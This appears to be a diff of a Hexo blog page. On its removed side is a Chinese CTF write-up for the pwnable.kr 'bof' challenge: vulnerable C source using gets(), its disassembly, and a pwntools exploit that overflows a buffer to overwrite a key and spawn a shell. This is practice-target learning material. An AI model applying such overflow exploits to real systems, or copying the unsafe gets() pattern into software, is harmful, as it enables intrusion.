@@ -6,20 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>PWN学习之[Toddler&#39;s Bottle]-[bof] | Magician&#39;s blog</title>
+  <title>Tag: ctf | Magician&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="将bof和bof.c文件下载下来">
-<meta name="keywords" content="pwn">
-<meta property="og:type" content="article">
-<meta property="og:title" content="PWN学习之[Toddler&#39;s Bottle]-[bof]">
-<meta property="og:url" content="http://yoursite.com/2017/05/04/PWN学习之-Toddler-s-Bottle-bof/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Magician&#39;s blog">
+<meta property="og:url" content="http://yoursite.com/tags/ctf/index.html">
 <meta property="og:site_name" content="Magician&#39;s blog">
-<meta property="og:description" content="将bof和bof.c文件下载下来">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-05-04T15:56:54.823Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PWN学习之[Toddler&#39;s Bottle]-[bof]">
-<meta name="twitter:description" content="将bof和bof.c文件下载下来">
+<meta name="twitter:title" content="Magician&#39;s blog">
   
     <link rel="alternative" href="/atom.xml" title="Magician&#39;s blog" type="application/atom+xml">
   
@@ -155,167 +150,60 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-PWN学习之-Toddler-s-Bottle-bof" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      PWN学习之[Toddler&#39;s Bottle]-[bof]
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2017" class="archive-year">2017</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2017/08/18/JarvisOJ-You-Need-Python-wp/" class="archive-article-date">
+  	<time datetime="2017-08-19T04:12:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-08-18</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2017/08/18/JarvisOJ-You-Need-Python-wp/">JarvisOJ-You Need Python wp</a>
     </h1>
   
 
-        
-        <a href="/2017/05/04/PWN学习之-Toddler-s-Bottle-bof/" class="archive-article-date">
-  	<time datetime="2017-05-05T06:55:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-05-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>将bof和bof.c文件下载下来<a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">void func(int key)&#123;</div><div class="line">	char overflowme[32];</div><div class="line">	printf(&quot;overflow me : &quot;);</div><div class="line">	gets(overflowme);	// smash me!</div><div class="line">	if(key == 0xcafebabe)&#123;</div><div class="line">		system(&quot;/bin/sh&quot;);</div><div class="line">	&#125;</div><div class="line">	else&#123;</div><div class="line">		printf(&quot;Nah..\n&quot;);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">int main(int argc, char* argv[])&#123;</div><div class="line">	func(0xdeadbeef);</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>通过bof.c可以看到当key==0xcafebabe时获得shell，但是由于func函数传入的实参为0xdeadbeef，看起来不可能实现get shell</p>
-<p>但是我们注意到func函数通过gets函数获取overflowme的值，这就给了我们溢出的基础，通过溢出overflowme覆盖key的值从而使的key==0xcafebabe。</p>
-<p>查看func的汇编代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">0x0000062c &lt;+0&gt;:	push   ebp</div><div class="line">  0x0000062d &lt;+1&gt;:	mov    ebp,esp</div><div class="line">  0x0000062f &lt;+3&gt;:	sub    esp,0x48</div><div class="line">  0x00000632 &lt;+6&gt;:	mov    eax,gs:0x14</div><div class="line">  0x00000638 &lt;+12&gt;:	mov    DWORD PTR [ebp-0xc],eax</div><div class="line">  0x0000063b &lt;+15&gt;:	xor    eax,eax</div><div class="line">  0x0000063d &lt;+17&gt;:	mov    DWORD PTR [esp],0x78c</div><div class="line">  0x00000644 &lt;+24&gt;:	call   0x645 &lt;func+25&gt;</div><div class="line">  0x00000649 &lt;+29&gt;:	lea    eax,[ebp-0x2c]  //[ebp-0x2c]为overflowme</div><div class="line">  0x0000064c &lt;+32&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">  0x0000064f &lt;+35&gt;:	call   0x650 &lt;func+36&gt;</div><div class="line">  0x00000654 &lt;+40&gt;:	cmp    DWORD PTR [ebp+0x8],0xcafebabe   //[ebp+0x8]为key</div><div class="line">  0x0000065b &lt;+47&gt;:	jne    0x66b &lt;func+63&gt;</div><div class="line">  0x0000065d &lt;+49&gt;:	mov    DWORD PTR [esp],0x79b</div><div class="line">  0x00000664 &lt;+56&gt;:	call   0x665 &lt;func+57&gt;</div><div class="line">  0x00000669 &lt;+61&gt;:	jmp    0x677 &lt;func+75&gt;</div><div class="line">  0x0000066b &lt;+63&gt;:	mov    DWORD PTR [esp],0x7a3</div><div class="line">  0x00000672 &lt;+70&gt;:	call   0x673 &lt;func+71&gt;</div><div class="line">  0x00000677 &lt;+75&gt;:	mov    eax,DWORD PTR [ebp-0xc]</div><div class="line">  0x0000067a &lt;+78&gt;:	xor    eax,DWORD PTR gs:0x14</div><div class="line">  0x00000681 &lt;+85&gt;:	je     0x688 &lt;func+92&gt;</div><div class="line">  0x00000683 &lt;+87&gt;:	call   0x684 &lt;func+88&gt;</div><div class="line">  0x00000688 &lt;+92&gt;:	leave  </div><div class="line">  0x00000689 &lt;+93&gt;:	ret</div></pre></td></tr></table></figure>
-<p>通过汇编代码我们可以看到，[ebp-0x2c]即为overflowme，[ebp+0x8]为key。所以我们只需要填充52个字节再加上0xcafebabe即可获得shell。</p>
-<p>因此我们的exp为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">payload=&apos;a&apos;*52+p32(0xcafebabe)</div><div class="line">#p=process(&quot;./bof&quot;)</div><div class="line">p=remote(&apos;pwnable.kr&apos;,9000)</div><div class="line">p.recvline()</div><div class="line">p.recvuntil(&quot;\n&quot;)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
-<p>再执行cat flag命令即可获取flag了。</p>
-<p>最后附上文件方便实践:<a href="http://pan.baidu.com/s/1slhjFvZ" target="_blank" rel="external">链接</a></p>
-
-      
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/05/04/PWN学习之-Toddler-s-Bottle-bof/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2017/05/08/PWN学习之-Rookiss-simple-login/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          PWN学习之[Rookiss]-[simple login]
-        
-      </div>
-    </a>
   
   
-    <a href="/2017/05/03/PWN学习之-Toddler-s-Bottle-passcode/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">PWN学习之[Toddler&#39;s Bottle]-[passcode]</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-
-
-
-
-  
-    <div class="duoshuo"></div>
+    </div></section>
   
 
-
+    
 
 
           </div>
@@ -338,9 +226,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
-		isTag: false,
+		isTag: true,
 		isCategory: false,
 		open_in_new: false,
 		root: "/",
